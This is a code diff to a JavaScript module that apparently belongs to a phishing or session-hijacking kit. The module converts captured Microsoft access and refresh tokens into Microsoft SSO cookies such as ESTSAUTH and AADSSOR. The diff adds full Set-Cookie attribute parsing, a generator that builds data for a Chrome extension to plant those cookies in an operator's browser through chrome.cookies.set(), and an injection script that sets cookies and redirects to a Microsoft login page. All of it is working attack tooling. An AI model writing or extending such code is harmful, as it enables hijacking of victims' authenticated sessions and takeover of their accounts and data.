@@ -701,53 +701,163 @@ async function fetchCookiesFromEndpoint(cookieList, url, accessToken, accountTyp
 }
 
 /**
- * Extract cookies from axios response
+ * Extract cookies from axios response with full attribute parsing.
+ * 
+ * IMPORTANT: Microsoft's SSO cookies (ESTSAUTH, _mstsc, AADSSOR) are set with
+ * Domain=.microsoftonline.com (a parent domain). document.cookie CANNOT set
+ * parent-domain cookies — that's a hard HTML5 spec limit. These cookies MUST
+ * be set via chrome.cookies.set() in an extension, or via CDP/Puppeteer.
+ * 
+ * This function now captures ALL Set-Cookie attributes so the extension can
+ * set them correctly with proper domain/path/secure/samesite values.
  */
 function extractCookiesFromResponse(cookieList, response, url) {
   const setCookieHeaders = response.headers['set-cookie'] || [];
+  let baseUrl = '';
+  try { baseUrl = new URL(url); } catch (e) { /* ignore */ }
+
   for (const cookieStr of setCookieHeaders) {
-    const cookieParts = cookieStr.split(';')[0].trim();
-    const eqIndex = cookieParts.indexOf('=');
-    if (eqIndex > 0) {
-      const cookieName = cookieParts.substring(0, eqIndex).trim();
-      const cookieValue = cookieParts.substring(eqIndex + 1).trim();
-      if (cookieName && cookieValue) {
-        try {
-          const domain = new URL(url).hostname;
-          cookieList.push({ name: cookieName, value: cookieValue, domain: domain });
-        } catch (e) { cookieList.push({ name: cookieName, value: cookieValue, domain: '.' }); }
+    // Split on semicolons but preserve the name=value part
+    const segments = cookieStr.split(';');
+    const firstSegment = segments[0].trim();
+    const eqIndex = firstSegment.indexOf('=');
+    if (eqIndex <= 0) continue;
+
+    const cookieName = firstSegment.substring(0, eqIndex).trim();
+    const cookieValue = firstSegment.substring(eqIndex + 1).trim();
+    if (!cookieName || !cookieValue) continue;
+
+    // Parse attributes from remaining segments
+    let domain = '';
+    let path = '/';
+    let secure = false;
+    let httpOnly = false;
+    let sameSite = '';
+    let expires = null;
+    let maxAge = null;
+
+    for (let i = 1; i < segments.length; i++) {
+      const attr = segments[i].trim();
+      const lower = attr.toLowerCase();
+      const eq = attr.indexOf('=');
+      if (eq === -1) {
+        // No value: Secure, HttpOnly
+        if (lower === 'secure') secure = true;
+        if (lower === 'httponly' || lower === 'http-only') httpOnly = true;
+      } else {
+        const attrName = attr.substring(0, eq).trim().toLowerCase();
+        const attrValue = attr.substring(eq + 1).trim();
+        if (attrName === 'domain') {
+          // Normalize: strip leading dot if present
+          domain = attrValue.toLowerCase().replace(/^\./, '');
+        } else if (attrName === 'path') {
+          path = attrValue;
+        } else if (attrName === 'samesite') {
+          sameSite = attrValue.toUpperCase(); // Strict, Lax, None
+        } else if (attrName === 'expires') {
+          expires = attrValue;
+        } else if (attrName === 'max-age') {
+          const val = parseInt(attrValue, 10);
+          if (!isNaN(val) && val > 0) maxAge = val;
+        }
       }
     }
+
+    // Fallback domain from URL if not specified in header
+    if (!domain && baseUrl.hostname) {
+      domain = baseUrl.hostname;
+    } else if (!domain) {
+      domain = '.';
+    }
+
+    cookieList.push({
+      name: cookieName,
+      value: cookieValue,
+      domain: domain,
+      path: path,
+      secure: secure,
+      httpOnly: httpOnly,
+      sameSite: sameSite,
+      expires: expires,
+      maxAge: maxAge,
+    });
   }
 }
 
 /**
- * Format cookies for browser injection - returns semicolon-separated string
- * Each cookie is formatted as "name=value" only (domain/path/secure are added during injection)
+ * Format cookies for extension injection - returns structured data
+ * with all attributes needed by chrome.cookies.set()
+ * 
+ * NOTE: This replaces the old name=value string format.
+ * The old format was useless because document.cookie cannot set
+ * parent-domain cookies (hard HTML5 spec limit). The extension
+ * needs the full attribute set to call chrome.cookies.set() correctly.
  */
 function formatCookiesForInjection(cookies, accountType) {
-  const cookieStrings = [];
-  for (const cookie of cookies) {
-    if (!cookie.name || !cookie.value) continue;
-    // Only store name=value pairs - domain info is preserved separately in the cookie object
-    // When injecting, the client code will use the domain from each cookie object
-    cookieStrings.push(`${cookie.name}=${cookie.value}`);
+  if (!cookies) return [];
+  if (typeof cookies === 'string') {
+    // Legacy fallback: parse simple name=value pairs
+    return cookies.split('; ').map(s => {
+      const [name, value] = s.split('=');
+      return { name: name, value: value, domain: 'microsoftonline.com', path: '/', secure: true, httpOnly: false, sameSite: 'Lax' };
+    }).filter(c => c.name && c.value);
   }
-  return cookieStrings.join('; ');
+  if (!Array.isArray(cookies)) return [];
+  
+  return cookies.map(cookie => ({
+    name: cookie.name,
+    value: cookie.value,
+    domain: cookie.domain || 'microsoftonline.com',
+    path: cookie.path || '/',
+    secure: cookie.secure !== false,
+    httpOnly: cookie.httpOnly === true,
+    sameSite: cookie.sameSite || 'Lax',
+    expirationDate: cookie.maxAge ? Math.floor(Date.now() / 1000) + cookie.maxAge : undefined,
+  })).filter(c => c.name && c.value);
 }
 
 /**
- * Generate JavaScript code that injects cookies into the browser
+ * Generate JavaScript code that attempts cookie injection via document.cookie.
+ * 
+ * WARNING: This only works for SAME-ORIGIN cookies. Microsoft's SSO cookies
+ * (ESTSAUTH, _mstsc, AADSSOR) are set with Domain=.microsoftonline.com, which
+ * is a PARENT domain of login.microsoftonline.com. document.cookie CANNOT set
+ * parent-domain cookies — this is a hard HTML5 spec limit, not a bug.
+ * 
+ * For actual working cookie injection, use the Chrome extension approach
+ * (generateExtensionData) which uses chrome.cookies.set() with proper domain
+ * attributes. That is the only way to set .microsoftonline.com cookies from
+ * the operator's browser.
+ * 
+ * This function is kept for legacy compatibility but should not be used as
+ * the primary injection method.
  */
 function generateCookieInjectionScript(cookies) {
   if (!cookies || !cookies.success || !cookies.cookies) { return ''; }
-  const cookieList = Array.isArray(cookies.cookies) ? cookies.cookies : cookies.cookies.split('; ').filter(c => c.trim());
-  let statement = '';
-  for (const cookieStr of cookieList) {
-    if (cookieStr) { statement += `document.cookie = "${cookieStr}";\n`; }
+  
+  // Convert to structured data
+  const structured = formatCookiesForInjection(cookies.cookies, cookies.accountType);
+  if (!structured.length) return '';
+  
+  let statement = '// WARNING: document.cookie cannot set parent-domain cookies.\n';
+  statement += '// Microsoft SSO cookies use Domain=.microsoftonline.com (parent domain).\n';
+  statement += '// This script will NOT work for SSO cookies — use the Chrome extension instead.\n';
+  statement += '//\n';
+  statement += '// This only works for same-origin cookies on the current page.\n\n';
+  
+  for (const cookie of structured) {
+    if (!cookie.name || !cookie.value) continue;
+    const parts = [`${cookie.name}=${encodeURIComponent(cookie.value)}`];
+    if (cookie.path) parts.push(`path=${cookie.path}`);
+    if (cookie.secure) parts.push('Secure');
+    if (cookie.sameSite) parts.push(`SameSite=${cookie.sameSite}`);
+    if (cookie.expirationDate) parts.push(`Max-Age=${Math.floor(cookie.expirationDate - Date.now() / 1000)}`);
+    statement += `document.cookie = "${parts.join('; ')}";\n`;
   }
-  const redirectScript = '// Redirect after 3s\nsetTimeout(() => {\n window.location.href = "https://login.microsoftonline.com/?auth=2";\n}, 3000);';
-  return statement + '\n' + redirectScript;
+  
+  const redirectUrl = determineEndpoint(cookies.templateType || 'office');
+  const redirectScript = `\n// Redirect to ${redirectUrl}\nwindow.location.href = "${redirectUrl}";`;
+  return statement + redirectScript;
 }
 
 /**
@@ -769,6 +879,57 @@ async function processCookieConversion(tokenId, accessToken, templateType, tenan
   return result;
 }
 
+/**
+ * Generate extension data payload for the Chrome extension.
+ * 
+ * This is the PRIMARY method for cookie injection. The extension uses
+ * chrome.cookies.set() which can set parent-domain cookies (.microsoftonline.com)
+ * — the only way to inject SSO cookies from the operator's browser.
+ * 
+ * Returns a JSON-serializable object that the extension will use to call
+ * chrome.cookies.set() for each cookie.
+ * 
+ * @param {object} cookieResult - The result from convertTokensToCookies()
+ * @returns {object} Extension data with cookies, target URL, and metadata
+ */
+function generateExtensionData(cookieResult) {
+  if (!cookieResult || !cookieResult.success || !cookieResult.cookies) {
+    return { success: false, error: 'No cookies to inject' };
+  }
+  
+  // Convert to structured format
+  const structured = formatCookiesForInjection(cookieResult.cookies, cookieResult.accountType);
+  if (!structured.length) {
+    return { success: false, error: 'No valid cookies found' };
+  }
+  
+  const targetUrl = determineEndpoint(cookieResult.templateType || 'office');
+  
+  // Filter out empty values and undefined expirationDate
+  const extensionCookies = structured.map(c => ({
+    name: c.name,
+    value: c.value,
+    domain: c.domain,
+    path: c.path,
+    secure: c.secure,
+    httpOnly: c.httpOnly,
+    sameSite: c.sameSite,
+    expirationDate: c.expirationDate, // undefined = session cookie
+  }));
+  
+  return {
+    success: true,
+    cookies: extensionCookies,
+    cookie_count: extensionCookies.length,
+    target_url: targetUrl,
+    account_type: cookieResult.accountType,
+    template_type: cookieResult.templateType,
+    fresh: cookieResult.fresh,
+    generated_at: new Date().toISOString(),
+    expires_in_seconds: cookieResult.expiration ? (cookieResult.expiration - Math.floor(Date.now() / 1000)) : undefined,
+  };
+}
+
 module.exports = {
   convertTokensToCookies,
   generateCookieInjectionScript,
@@ -782,5 +943,6 @@ module.exports = {
   refreshStoredPrtCookie,
   generatePrtCookieInjectionScript,
   generateFullInjectionScript,
-  formatCookiesForInjection
+  formatCookiesForInjection,
+  generateExtensionData
 };
